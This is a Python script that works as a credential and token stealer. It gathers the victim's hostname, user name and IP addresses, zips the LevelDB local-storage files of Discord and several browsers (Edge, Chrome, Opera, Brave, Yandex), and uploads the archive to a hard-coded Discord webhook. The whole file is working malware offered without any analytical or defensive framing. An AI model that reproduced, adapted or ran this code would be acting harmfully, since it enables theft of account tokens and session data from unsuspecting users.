import os
import zipfile
import requests
import random
import datetime
import time
import string
import tempfile
import socket
import requests
import getpass
import base64, codecs
#WEBHOOK_URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/1054102989721313311/_oXOFzejbOqsb8Q5-LMIqmStS7iRJNwuoi88pH8DhlDXnm-n1rIv4mHFqXdlm8G6phwE'

TEMP = tempfile.gettempdir()
os.chdir(TEMP)

#HOST
hostname = socket.gethostname()
user = getpass.getuser()
#IP
ip_address = socket.gethostbyname(hostname)
response = requests.get('https://api.ipify.org?format=json')

#PUBLIC IP
ip_public = response.json()['ip']

#DABATASE
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
DB = "\\LOCAL STORAGE\\LEVELDB"


#PATH
PLATFORM = "EDGE"
DIRETORIOS = [LOCAL + "\\MICROSOFT\\EDGE\\USER DATA\\DEFAULT" + DB, 
              LOCAL + "\\MICROSOFT\\EDGE\\USER DATA\\PROFILE 1" + DB, 
              LOCAL + "\\MICROSOFT\\EDGE\\USER DATA\\PROFILE 2" + DB,
              LOCAL + "\\MICROSOFT\\EDGE\\USER DATA\\PROFILE 3" + DB,
              LOCAL + "\\MICROSOFT\\EDGE\\USER DATA\\PROFILE 4" + DB,
              LOCAL + "\\MICROSOFT\\EDGE\\USER DATA\\PROFILE 5" + DB
]       

#CONFIG
ZIP = f'{user} ' + ''.join(random.choice(string.digits) for _ in range(8)) + '.zip'
EXT = ['.log', '.ldb']

#ZIP
for diretorio in DIRETORIOS:
    if os.path.exists(diretorio):
        with zipfile.ZipFile(ZIP, 'a') as zipf:
            for pasta_atual, subpastas, arquivos in os.walk(diretorio):
                for arquivo in arquivos:
                    caminho_completo = os.path.join(pasta_atual, arquivo)
                    extensao = os.path.splitext(arquivo)[1]
                    if extensao in EXT:
                        nome_no_zip = os.path.relpath(caminho_completo, diretorio)
                        #
                        contador = 1
                        nome_no_zip_original = nome_no_zip
                        while nome_no_zip in zipf.namelist():
                            nome_no_zip = f'{os.path.splitext(nome_no_zip_original)[0]}_{contador}{extensao}'
                            contador += 1
                        zipf.write(caminho_completo, nome_no_zip)
    else:
        time.sleep(0.001)





#PATH
PLATFORM = "DISCORD"
DIRETORIOS = [ROAMING + "\\DISCORD" + DB,
              ROAMING + "\\DISCORDCANARY" + DB,
              ROAMING + "\\DISCORDPTB" + DB
]


#ZIP
for diretorio in DIRETORIOS:
    if os.path.exists(diretorio):
        with zipfile.ZipFile(ZIP, 'a') as zipf:
            for pasta_atual, subpastas, arquivos in os.walk(diretorio):
                for arquivo in arquivos:
                    caminho_completo = os.path.join(pasta_atual, arquivo)
                    extensao = os.path.splitext(arquivo)[1]
                    if extensao in EXT:
                        nome_no_zip = os.path.relpath(caminho_completo, diretorio)
                        #
                        contador = 1
                        nome_no_zip_original = nome_no_zip
                        while nome_no_zip in zipf.namelist():
                            nome_no_zip = f'{os.path.splitext(nome_no_zip_original)[0]}_{contador}{extensao}'
                            contador += 1
                        zipf.write(caminho_completo, nome_no_zip)







#PATH
PLATFORM = "CHROME"
DIRETORIOS = [LOCAL + "\\GOOGLE\\CHROME\\USER DATA\\DEFAULT" + DB,
              LOCAL + "\\GOOGLE\\CHROME\\USER DATA\\PROFILE 1" + DB,
              LOCAL + "\\GOOGLE\\CHROME\\USER DATA\\PROFILE 2" + DB,
              LOCAL + "\\MICROSOFT\\EDGE\\USER DATA\\PROFILE 3" + DB,
              LOCAL + "\\MICROSOFT\\EDGE\\USER DATA\\PROFILE 4" + DB,
              LOCAL + "\\MICROSOFT\\EDGE\\USER DATA\\PROFILE 5" + DB
]


#ZIP
for diretorio in DIRETORIOS:
    if os.path.exists(diretorio):
        with zipfile.ZipFile(ZIP, 'a') as zipf:
            for pasta_atual, subpastas, arquivos in os.walk(diretorio):
                for arquivo in arquivos:
                    caminho_completo = os.path.join(pasta_atual, arquivo)
                    extensao = os.path.splitext(arquivo)[1]
                    if extensao in EXT:
                        nome_no_zip = os.path.relpath(caminho_completo, diretorio)
                        #
                        contador = 1
                        nome_no_zip_original = nome_no_zip
                        while nome_no_zip in zipf.namelist():
                            nome_no_zip = f'{os.path.splitext(nome_no_zip_original)[0]}_{contador}{extensao}'
                            contador += 1
                        zipf.write(caminho_completo, nome_no_zip)










#PATH
PLATFORM = "OPERA"
DIRETORIOS = [ROAMING + "\\OPERA SOFTWARE\\OPERA STABLE" + DB,
              ROAMING + "\\OPERA SOFTWARE\\OPERA GX STABLE" + DB
]


#ZIP
for diretorio in DIRETORIOS:
    if os.path.exists(diretorio):
        with zipfile.ZipFile(ZIP, 'a') as zipf:
            for pasta_atual, subpastas, arquivos in os.walk(diretorio):
                for arquivo in arquivos:
                    caminho_completo = os.path.join(pasta_atual, arquivo)
                    extensao = os.path.splitext(arquivo)[1]
                    if extensao in EXT:
                        nome_no_zip = os.path.relpath(caminho_completo, diretorio)
                        #
                        contador = 1
                        nome_no_zip_original = nome_no_zip
                        while nome_no_zip in zipf.namelist():
                            nome_no_zip = f'{os.path.splitext(nome_no_zip_original)[0]}_{contador}{extensao}'
                            contador += 1
                        zipf.write(caminho_completo, nome_no_zip)



















#PATH
PLATFORM = "BRAVE"
DIRETORIOS = [LOCAL + "\\BRAVESOFTWARE\\BRAVE-BROWSER\\USER DATA\\DEFAULT" + DB,
              LOCAL + "\\BRAVESOFTWARE\\BRAVE-BROWSER\\USER DATA\\PROFILE 1" + DB,
              LOCAL + "\\BRAVESOFTWARE\\BRAVE-BROWSER\\USER DATA\\PROFILE 2" + DB,
              LOCAL + "\\BRAVESOFTWARE\\BRAVE-BROWSER\\USER DATA\\PROFILE 3" + DB,
              LOCAL + "\\BRAVESOFTWARE\\BRAVE-BROWSER\\USER DATA\\PROFILE 4" + DB,
              LOCAL + "\\BRAVESOFTWARE\\BRAVE-BROWSER\\USER DATA\\PROFILE 5" + DB
]


#ZIP
for diretorio in DIRETORIOS:
    if os.path.exists(diretorio):
        with zipfile.ZipFile(ZIP, 'a') as zipf:
            for pasta_atual, subpastas, arquivos in os.walk(diretorio):
                for arquivo in arquivos:
                    caminho_completo = os.path.join(pasta_atual, arquivo)
                    extensao = os.path.splitext(arquivo)[1]
                    if extensao in EXT:
                        nome_no_zip = os.path.relpath(caminho_completo, diretorio)
                        #
                        contador = 1
                        nome_no_zip_original = nome_no_zip
                        while nome_no_zip in zipf.namelist():
                            nome_no_zip = f'{os.path.splitext(nome_no_zip_original)[0]}_{contador}{extensao}'
                            contador += 1
                        zipf.write(caminho_completo, nome_no_zip)












#PATH
PLATFORM = "YANDEX"
DIRETORIOS = [LOCAL + "\\YANDEX\\YANDEXBROWSER\\USER DATA\\DEFAULT" + DB,
              LOCAL + "\\YANDEX\\YANDEXBROWSER\\USER DATA\\PROFILE 1" + DB,
              LOCAL + "\\YANDEX\\YANDEXBROWSER\\USER DATA\\PROFILE 2" + DB,
              LOCAL + "\\YANDEX\\YANDEXBROWSER\\USER DATA\\PROFILE 3" + DB,
              LOCAL + "\\YANDEX\\YANDEXBROWSER\\USER DATA\\PROFILE 4" + DB,
              LOCAL + "\\YANDEX\\YANDEXBROWSER\\USER DATA\\PROFILE 5" + DB
]


#ZIP
for diretorio in DIRETORIOS:
    if os.path.exists(diretorio):
        with zipfile.ZipFile(ZIP, 'a') as zipf:
            for pasta_atual, subpastas, arquivos in os.walk(diretorio):
                for arquivo in arquivos:
                    caminho_completo = os.path.join(pasta_atual, arquivo)
                    extensao = os.path.splitext(arquivo)[1]
                    if extensao in EXT:
                        nome_no_zip = os.path.relpath(caminho_completo, diretorio)
                        #
                        contador = 1
                        nome_no_zip_original = nome_no_zip
                        while nome_no_zip in zipf.namelist():
                            nome_no_zip = f'{os.path.splitext(nome_no_zip_original)[0]}_{contador}{extensao}'
                            contador += 1
                        zipf.write(caminho_completo, nome_no_zip)












#PATH
PLATFORM = "CHROME SXS"
DIRETORIOS = [LOCAL + "\\GOOGLE\\CHROME SXS\\USER DATA\\DEFAULT" + DB,
              LOCAL + "\\GOOGLE\\CHROME SXS\\USER DATA\\PROFILE 1" + DB,
              LOCAL + "\\GOOGLE\\CHROME SXS\\USER DATA\\PROFILE 2" + DB,
              LOCAL + "\\GOOGLE\\CHROME SXS\\USER DATA\\PROFILE 3" + DB,
              LOCAL + "\\GOOGLE\\CHROME SXS\\USER DATA\\PROFILE 4" + DB,
              LOCAL + "\\GOOGLE\\CHROME SXS\\USER DATA\\PROFILE 5" + DB
]


#ZIP
for diretorio in DIRETORIOS:
    if os.path.exists(diretorio):
        with zipfile.ZipFile(ZIP, 'a') as zipf:
            for pasta_atual, subpastas, arquivos in os.walk(diretorio):
                for arquivo in arquivos:
                    caminho_completo = os.path.join(pasta_atual, arquivo)
                    extensao = os.path.splitext(arquivo)[1]
                    if extensao in EXT:
                        nome_no_zip = os.path.relpath(caminho_completo, diretorio)
                        #
                        contador = 1
                        nome_no_zip_original = nome_no_zip
                        while nome_no_zip in zipf.namelist():
                            nome_no_zip = f'{os.path.splitext(nome_no_zip_original)[0]}_{contador}{extensao}'
                            contador += 1
                        zipf.write(caminho_completo, nome_no_zip)


#MENGAGEM
message = f'**BRUTEFORCE #LOG - {PLATFORM.upper()} (STARTED AT: {datetime.datetime.now().replace(second=0, microsecond=0)})**\n'
message += f'```IP: {ip_address}/{ip_public}        HOSTNAME: {hostname}```\n'

#PAYLOADS
with open(ZIP, 'rb') as arquivo:
    payload = {'content': message}
    files = {'file': arquivo}
    response = requests.post(WEBHOOK_URL, data=payload, files=files)
